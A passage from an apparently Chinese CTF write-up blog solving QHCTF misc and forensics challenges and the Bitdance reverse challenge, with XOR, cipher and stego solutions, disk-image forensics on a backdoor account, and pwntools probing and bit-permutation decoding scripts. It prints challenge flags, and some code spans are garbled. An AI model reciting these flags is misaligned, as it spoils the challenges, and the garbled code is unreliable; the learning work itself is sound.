src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126003847660.png" alt="image-20250126003457564"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">hex_string = <span class="string">&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;</span></span><br><span class="line">byte_array = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line">xor_key = <span class="number">0x5A</span></span><br><span class="line">result = <span class="built_in">bytearray</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> byte <span class="keyword">in</span> byte_array:</span><br><span class="line">    result.append(byte ^ xor_key)</span><br><span class="line"></span><br><span class="line">result_hex = result.<span class="built_in">hex</span>() </span><br><span class="line">result_string = result.decode(errors=<span class="string">&#x27;ignore&#x27;</span>)  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span>, result_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag: QHCTF&#123;a8226103-5a9a-4fa7-abcf-dea438a7ce78&#125;</span></span><br></pre></td></tr></table></figure><hr><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="QHCTF-For-Year-2025"><a href="#QHCTF-For-Year-2025" class="headerlink" title="QHCTF For Year 2025"></a>QHCTF For Year 2025</h3><p>给了hint，发现数字都是不超过31的，并且分为了10组</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126121215688.png" alt="image-20250126121001306"></p><p>还给了一个日历</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126121218652.png" alt="image-20250126121146944"></p><p>将数字在日历上对应，可以得到flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126121530499.png" alt="c13cd00017a4b4b752ee487d450f227"></p><blockquote><p>QHCTF{FUN}，注意最后是N，区别前面的H</p></blockquote><h3 id="你能看懂这串未知的文字吗"><a href="#你能看懂这串未知的文字吗" class="headerlink" title="你能看懂这串未知的文字吗"></a>你能看懂这串未知的文字吗</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126121545232.png" alt="image-20250126121524162"></p><p>拿到图片去百度识图，找到羊文对应字母表</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126121646872.png" alt="微信图片_20250125153358"></p><p>翻译过来是<code>szfpguwizgwesqzoaoerv</code></p><p>比赛的时候没去扫图片，其实图里面藏了秘钥<code>qihangbeiiseasy</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126122039544.png" alt="image-20250126122036890"></p><p>拿工具去跑，发现是维吉尼亚密码</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250126122249872.png" alt="image-20250126122247106"></p><blockquote><p>QHCTF{cryptoveryeasybysheep}</p></blockquote><h3 id="PvzHE"><a href="#PvzHE" class="headerlink" title="PvzHE"></a>PvzHE</h3><p>拿到附件观察日期，<code>images</code>目录下找到最近修改的一张图片，可以直接发现flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014717530.png" alt="image-20250126123325910"></p><blockquote><p>QHCTF{300cef31-68d9-4b72-b49d-a7802da481a5}</p><ul><li>居然就这么水灵灵的摆在这里了？！</li></ul></blockquote><h3 id="启动！"><a href="#启动！" class="headerlink" title="______启动！"></a>______启动！</h3><p><code>tcp流135</code>中找到<code>url</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014721948.png" alt="image-20250126125036863"></p><p>直接访问可以下载<code>log</code>文件，记事本打开</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014725339.png" alt="image-20250126124937136"></p><blockquote><p>QHCTF{69b62b46-de2f-4ac2-81f7-234613d25cfb}</p></blockquote><h3 id="猿类的编程语言你了解吗"><a href="#猿类的编程语言你了解吗" class="headerlink" title="猿类的编程语言你了解吗"></a>猿类的编程语言你了解吗</h3><p> 给了<code>jpg</code>图片</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127021647246.png" alt="image-20250127020823059"></p><p><code>jphs</code>去<code>seek</code>密码为空点击<code>OK</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127021644886.png" alt="image-20250127020904700"></p><p>保存后得到一个文件，内容为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p><code>Ook!</code>解密</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127023852664.png" alt="image-20250127023547841"></p><blockquote><p>QHCTF{2d55d0e4-a5a9-40ea-80f4-bc3603a0ea39}</p></blockquote><hr><h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><p>E01文件需要磁盘挂载+仿真</p><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/NDASH/article/details/109295885">https://blog.csdn.net/NDASH/article/details/109295885</a></p><p><a href="https://blog.csdn.net/youyou519/article/details/106859820">https://blog.csdn.net/youyou519/article/details/106859820</a></p></blockquote><p>挂载用Arsenal Image Mounter</p><ul><li>一开始用FTK Image挂载的，但是一直仿真不了，虚拟机打不开，后面才用的Arsenal Image Mounter</li></ul><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127015124419.png" alt="image-20250127015018513"></p><p>挂载后物理机上可以显示对应挂载磁盘</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127015127759.png" alt="image-20250127015119827"></p><p>仿真：<code>Save as new image file</code>导出<code>vmdk</code>文件，用<code>VM(以管理员身份运行)</code>开启虚拟机即可</p><h3 id="win01"><a href="#win01" class="headerlink" title="win01"></a>win01</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025100803.png" alt="image-20250126124412270"></p><h3 id="win02"><a href="#win02" class="headerlink" title="win02"></a>win02</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025103373.png" alt="image-20250126124438541"></p><p>后门账户<code>HackY$</code>，密码与登录密码相同<code>123456</code>，这个其实有点猜的成分，不知道还有什么其他好方法，欢迎大家指点</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014736104.png" alt="image-20250126230352609"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014738445.png" alt="image-20250127004842625"></p><blockquote><p>QHCTF{fb484ad326c0f3a4970d1352bfbafef8}</p></blockquote><h3 id="win04"><a href="#win04" class="headerlink" title="win04"></a>win04</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025113294.png" alt="image-20250126124503236"></p><p><code>win+r+regedit</code>打开注册表，进去就可以看到flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014742645.png" alt="image-20250126220935993"></p><blockquote><p>QHCTF{c980ad20-f4e4-4e72-81a0-f227f6345f01}</p></blockquote><h3 id="win05"><a href="#win05" class="headerlink" title="win05"></a>win05</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025138798.png" alt="image-20250126124521545"></p><h3 id="win06"><a href="#win06" class="headerlink" title="win06"></a>win06</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025158284.png" alt="image-20250126124539586"></p><h3 id="win07"><a href="#win07" class="headerlink" title="win07"></a>win07</h3><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127025219755.png" alt="image-20250126124554056"></p><p>在<code>HackY$</code>的桌面上发现<code>flag.zip</code>文件</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014747958.png" alt="image-20250126214735379"></p><p>解压需要密码，提示在环境变量中</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014751153.png" alt="image-20250126221610494"></p><p>打开环境变量发现解压密码</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014753612.png" alt="image-20250126222105960"></p><p>解压后是一段<code>base64</code>，去拿工具解码，得到flag</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014756814.png" alt="image-20250126222231092"></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014758668.png" alt="image-20250126222348187"></p><blockquote><p>QHCTF{6143b46a-8e98-4356-a9b2-251a7ec19e51}</p></blockquote><h3 id="漏出的题目"><a href="#漏出的题目" class="headerlink" title="漏出的题目"></a>漏出的题目</h3><ul><li>好像是出题人忘记放题了。。。</li></ul><p><code>Admin</code>桌面上有一个<code>Hacker_.exe</code>文件</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014801574.png" alt="image-20250127005910086"></p><p><code>python</code>写的<code>exe</code>文件，用<code>pyinstxtractor</code>解包</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014803360.png" alt="image-20250127010419477"></p><p>拿工具反编译<code>1.pyc</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014805584.png" alt="image-20250127013556492"></p><p>加密逻辑为：<code>AES(ECB) + base64 + xor + base64</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014808158.png" alt="image-20250127013407692"></p><p>解密将上述加密逆过来即可</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250127014811621.png" alt="image-20250127013134093"></p><blockquote><p>QHCTF{8b0c14a8-5823-46fd-a547-0dcdc404a7ed}</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第八届西湖论剑网络安全技能大赛</title>
      <link href="/2025/01/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/"/>
      <url>/2025/01/25/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>第一次参加西湖论剑，实力太弱，只能被各路大佬碾压，在这里对比赛中写的两道题来做个记录…</p></blockquote><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Bitdance"><a href="#Bitdance" class="headerlink" title="Bitdance"></a>Bitdance</h3><p>题目没给附件</p><p><code>nc/9999-&gt;139.155.126.78:28936</code></p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250125002204636.png" alt="51f5dcffab1e1f20a11ee802cefdeba"></p><p>脚本爆破下输入长度，得到长度为96位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_nc_and_check_response</span>():</span><br><span class="line">    length = <span class="number">1</span> </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        input_str = <span class="string">&#x27;a&#x27;</span> * length </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Trying with input: <span class="subst">&#123;input_str&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        process = subprocess.Popen([<span class="string">&#x27;nc&#x27;</span>, <span class="string">&#x27;139.155.126.78&#x27;</span>, <span class="string">&#x27;28936&#x27;</span>], </span><br><span class="line">                                   stdin=subprocess.PIPE, </span><br><span class="line">                                   stdout=subprocess.PIPE, </span><br><span class="line">                                   stderr=subprocess.PIPE,</span><br><span class="line">                                   text=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        stdout, stderr = process.communicate(<span class="built_in">input</span>=input_str + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Output: <span class="subst">&#123;stdout.strip()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Wrong length&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> stdout:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Successfully got a valid response!&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        length += <span class="number">1</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    run_nc_and_check_response()</span><br></pre></td></tr></table></figure><p>这道题是个黑盒测试，输入后返回加密的比特流，check的密文已经给出（Checking with）</p><p><img src="https://warmlight-1333681655.cos.ap-guangzhou.myqcloud.com/image/20250125010204201.png" alt="e48aeb5431d23fa7aaa862fd1d24838"></p><p>比赛的时候写到这里再往后就推不下去了，一直在盯着比特位的变化看，最后也没看出个所以然来</p><p>这里直接贴佬的wp，没有环境了，只能学习下思路</p><p>ZeroPointZero安全团队</p><blockquote><p><a href="https://mp.weixin.qq.com/s/yzNReMJXmkKY7Cv7q_7Phw">https://mp.weixin.qq.com/s/yzNReMJXmkKY7Cv7q_7Phw</a></p></blockquote><p>直接进行爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_io</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;139.155.126.78&quot;</span>, <span class="number">15419</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line">positions = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            payload = <span class="built_in">bytearray</span>(<span class="string">b&#x27;\xff&#x27;</span> * <span class="number">96</span>)</span><br><span class="line">            <span class="keyword">if</span> payload[x] &amp; (<span class="number">1</span> &lt;&lt; y):</span><br><span class="line">                payload[x] ^= (<span class="number">1</span> &lt;&lt; y)</span><br><span class="line">            io = get_io()</span><br><span class="line">            io.sendline(payload)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;Start from 0&quot;</span>)</span><br><span class="line"></span><br><span class="line">            result = io.recvuntil(<span class="string">&quot;with&quot;</span>).replace(<span class="string">b&quot;Checking with&quot;</span>, <span class="string">b&quot;&quot;</span>).strip().split(<span class="string">b&quot;\n&quot;</span>)[-<span class="number">1</span>][<span class="number">30</span>:-<span class="number">4</span>].decode()</span><br><span class="line">            result = <span class="string">&quot;2&quot;</span> + result</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result = result.index(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">                positions.append(result)</span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                positions.append(<span class="number">0</span>)</span><br><span class="line">run()</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quotquot;</span></span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> positions:</span><br><span class="line">    message += cipher[pos]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(message), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(message[z:z + <span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>官方wp</p><blockquote><p><a href="https://mp.weixin.qq.com/s/gXYLwdup6HYd_rETUSb9aA">https://mp.weixin.qq.com/s/gXYLwdup6HYd_rETUSb9aA</a></p></blockquote><p>先根据特征找到每次比特位移动的下标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :sh.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :sh.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :sh.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span> keepends=<span class="literal">False</span>     :sh.recvline(keepends)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :sh.recvuntil(delims, drop)</span><br><span class="line">ra      = <span class="keyword">lambda</span>                    :sh.recvall()</span><br><span class="line">sd      = <span class="keyword">lambda</span> data               :sh.shutdown(data)</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :sh.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(sh, a)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./BitDance&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so.6&#x27;</span> <span class="comment"># &#x27;/lib/i386-linux-gnu/libc.so.6&#x27; / &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">addr, debug</span>):</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> sh</span><br><span class="line"><span class="keyword">global</span> libc</span><br><span class="line"></span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(libc_path)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(debug == <span class="number">1</span>):</span><br><span class="line">        sh = process(binary)</span><br><span class="line"><span class="comment">#sh = process(binary,env=&#123;&quot;LD_PRELOAD&quot; : libc_path&#125;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">        ip = addr.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        port = addr.split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">        sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">    pd = <span class="string">&#x27;a&#x27;</span> * <span class="number">96</span></span><br><span class="line">    sla(<span class="string">&#x27;Welcome to dance: &#x27;</span>, pd)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;Start from 0\n&#x27;</span>)</span><br><span class="line">    rl()</span><br><span class="line"></span><br><span class="line">    index_list = [<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">96</span>*<span class="number">8</span>-<span class="number">1</span>):</span><br><span class="line">        data = rl()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 匹配目标字符串，其中 &#123;&#125; 内匹配 \x30 或 \x31</span></span><br><span class="line">        pattern = <span class="string">r&#x27;\x1b\x5b\x30\x6d\x1b\x5b\x30\x3b\x33\x31\x6d(\x30|\x31)\x1b\x5b\x30\x6d\x1b\x5b\x30\x3b\x33\x32\x6d&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 re.search 查找第一个匹配结果</span></span><br><span class="line">        <span class="keyword">match</span> = re.search(pattern, data)</span><br><span class="line"></span><br><span class="line">        index_list.append(<span class="keyword">match</span>.end() - <span class="number">30</span>) <span class="comment">#前面还有一个这样的标志，所以要减30</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(index_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">list</span>(<span class="built_in">reversed</span>(index_list)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pwn(<span class="string">&#x27;localhost:9999&#x27;</span>, <span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>遍历倒叙后的下标，把每个比特位向前移动回去</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">FindBitSrc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span>* box, <span class="type">unsigned</span> <span class="type">int</span> dwBitIdx, <span class="type">unsigned</span> <span class="type">int</span> dwBitNum)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwBitNum; i++)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">if</span> (box[i] == dwBitIdx)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">BitDecode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* cipher, <span class="type">unsigned</span> <span class="type">int</span>* box, <span class="type">unsigned</span> <span class="type">int</span> count)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> srcBit = cipher[<span class="number">0</span>] &gt;&gt; <span class="number">7</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dwBitNum = count;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> dwBitSrcIdx;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> destBit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (count--)</span><br><span class="line">  &#123;</span><br><span class="line">    dwBitSrcIdx = box[index];</span><br><span class="line"></span><br><span class="line">    destBit = (cipher[dwBitSrcIdx &gt;&gt; <span class="number">3</span>] &gt;&gt; (<span class="number">7</span> - (dwBitSrcIdx &amp; <span class="number">7</span>))) &amp; <span class="number">1</span>;</span><br><span class="line">    cipher[dwBitSrcIdx &gt;&gt; <span class="number">3</span>] ^= (srcBit ^ destBit) &lt;&lt; (<span class="number">7</span> - (dwBitSrcIdx &amp; <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line">    srcBit = destBit;</span><br><span class="line">    idx = dwBitSrcIdx;</span><br><span class="line">    index++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">BitDanceDecode</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* cipher, <span 